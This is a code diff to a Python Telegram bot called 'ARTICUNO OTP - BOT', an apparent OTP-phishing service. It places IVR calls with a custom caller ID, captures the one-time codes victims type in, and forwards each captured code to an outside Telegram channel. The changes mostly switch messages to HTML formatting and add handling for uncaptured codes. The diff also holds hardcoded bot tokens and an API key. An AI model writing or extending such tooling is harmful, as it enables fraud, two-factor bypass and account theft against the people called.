@@ -29,8 +29,6 @@ d_data='otbbotdatabase'
 
 
 
-
-
 ngrok_url= "https://sourceotp.online:8443"  # NGROK APP LINK HERE
 bot_tkn ='7229632476:AAFZHpaFIZzOJrskzphIfMoTsDyjSlZWwoc'  # YOUR BOT API bot_tkn HERE
 apiKey = '741852963741852963789456123'
@@ -147,7 +145,7 @@ def send_welcome(message):
     keyboard.add(item7,item6)
     keyboard.add(item8)
     mes2 = bot.send_photo(message.from_user.id,caption=f"""
-🚀 ARTICUNO OTP - BOT 🚀
+🚀 <b>ARTICUNO OTP - BOT </b>🚀
 
 i’m here to make IVR calls and capture DTMF inputs with any custom caller ID
 
@@ -159,7 +157,7 @@ Requirements?
 💰 Make lots of money
 📊 Get help & support 
 
-👇 To get started, please use the buttons below.""",reply_markup=keyboard,photo=open('starting_photp.jpg', 'rb')).message_id 
+👇 To get started, please use the buttons below.""",  parse_mode='HTML' , reply_markup=keyboard,photo=open('starting_photp.jpg', 'rb')).message_id 
     last_message_ids[message.from_user.id] = mes2
   
   c.close()
@@ -288,7 +286,7 @@ def Start_back(message):
         keyboard.add(item7,item6)
         keyboard.add(item8)
         bot.edit_message_caption(chat_id=message.from_user.id,caption=f"""
-🚀 ARTICUNO OTP - BOT 🚀
+🚀<b> ARTICUNO OTP - BOT </b>🚀
 
 i’m here to make IVR calls and capture DTMF inputs with any custom caller ID
 
@@ -300,7 +298,7 @@ Requirements?
 💰 Make lots of money
 📊 Get help & support 
 
-👇 To get started, please use the buttons below.""", message_id=last_message_ids[message.from_user.id],reply_markup=keyboard)
+👇 To get started, please use the buttons below.""", parse_mode='HTML' ,  message_id=last_message_ids[message.from_user.id],reply_markup=keyboard)
     except:
          send_welcome(message)
 
@@ -1058,7 +1056,11 @@ def custom_prebuild_script_call(script_id,chatid):
             item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
             keyboard.add(item1,item2) 
             bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
-            requests.post(f"""https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage?chat_id=-1002076456397&text=
+            requests.post(
+    "https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage",
+    data={
+        "chat_id": "-1002076456397",
+        "text": f"""
 ARTICUNO OTP 📲
 ➖➖➖➖➖➖
 Mode ➣ CustomCall  
@@ -1066,7 +1068,11 @@ Service name ➣ {custom_sc_src[2]}
 OTP ➣  {otp2} ✅
 Capture by ➣ @{voices[12][0:3]+"****"+voices[12][-3:]}
 
-BOT (https://t.me/Articunootpbot) | GROUP (https://t.me/+tqRNlgotcnkxOGNl) | CHANNEL (https://t.me/+j5GqAN60aZhhMzM1)""")
+<a href='https://t.me/Articunootpbot'>BOT</a> | <a href='https://t.me/+tqRNlgotcnkxOGNl'>GROUP</a> | <a href='https://t.me/+j5GqAN60aZhhMzM1'>CHANNEL</a>
+        """,
+        "parse_mode": "HTML"
+    }
+)
     c.close()
     return 'Webhook received successfully!', 200
 
@@ -1223,24 +1229,36 @@ def aplha_prebuild_script_call(script_id,chatid):
     "audiourl": f"https://sourceotp.online/scripts/{script_id}/output4.wav",
 }
             requests.post(url, json=data)
-            alpha_otp_grabbed(chatid)
-            keyboard = types.InlineKeyboardMarkup(row_width=2)
-            item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept_alpha")
-            item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny_alpha")
-            keyboard.add(item1,item2) 
-            bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
-            requests.post(f"""https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage?chat_id=-1002076456397&text=
+            if otp2 !="None":
+                alpha_otp_grabbed(chatid)
+                keyboard = types.InlineKeyboardMarkup(row_width=2)
+                item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept_alpha")
+                item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny_alpha")
+                keyboard.add(item1,item2) 
+                bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
+                response = requests.post(
+    "https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage",
+    data={
+        "chat_id": "-1002076456397",
+        "text": f"""
 ARTICUNO OTP 📲
 ➖➖➖➖➖➖
-Mode ➣ CustomCall  
+Mode ➣ Alpha-numeric-Call  
 Service name ➣ {custom_sc_src[2]}
 OTP ➣  {otp2} ✅
-Capture by ➣ @{voices[12][0:3]+"****"+voices[12][-3:]}
+Capture by ➣ @{voices[12][0:3]+"**"+voices[12][-3:]}
 
-BOT (https://t.me/Articunootpbot) | GROUP (https://t.me/+tqRNlgotcnkxOGNl) | CHANNEL (https://t.me/+j5GqAN60aZhhMzM1)""")
-         
-           
-        
+<a href='https://t.me/Articunootpbot'>BOT</a> | <a href='https://t.me/+tqRNlgotcnkxOGNl'>GROUP</a> | <a href='https://t.me/+j5GqAN60aZhhMzM1'>CHANNEL</a>
+        """,
+        "parse_mode": "HTML"
+    }
+)
+            elif otp2=="None":
+                keyboard = types.InlineKeyboardMarkup(row_width=2)
+                item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept_alpha")
+                item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny_alpha")
+                keyboard.add(item1,item2) 
+                bot.send_message(chatid,f"""<b><i>Code not captured.</i></b>""",parse_mode='HTML',reply_markup=keyboard)
     c.close()
     return 'Webhook received successfully!', 200
 
